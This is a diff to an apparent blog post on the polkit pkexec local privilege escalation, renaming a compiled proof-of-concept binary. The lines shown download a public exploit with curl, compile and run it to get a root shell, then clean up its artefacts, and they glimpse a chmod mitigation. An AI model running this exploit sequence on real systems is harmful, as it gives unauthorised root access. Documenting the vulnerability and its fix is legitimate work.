@@ -12,8 +12,8 @@ The big news in Linux today is the [Local Privilege Escalation in polkit's pkexe
 # id
 uid=1000(fak3r) gid=1000(fak3r) groups=1000(fak3r),27(sudo)
 $ curl -O https://haxx.in/files/blasty-vs-pkexec.c
-$ gcc blasty-vs-pkexec.c
-$ ./a.out
+$ gcc blasty-vs-pkexec.c -o pkexec-poc
+$ ./pkexec-poc
 [~] compile helper..
 [~] maybe get shell now?
 # id
@@ -34,7 +34,7 @@ chmod 755 /usr/bin/pkexec
 To remove the downloaded, and generated, code:
 
 ```
-rm -rf a.out blasty-vs-pkexec.c GCONV_PATH\=. lol payload.*
+rm -rf pkexec-poc blasty-vs-pkexec.c GCONV_PATH\=. lol payload.*
 ```
 
 ## Code
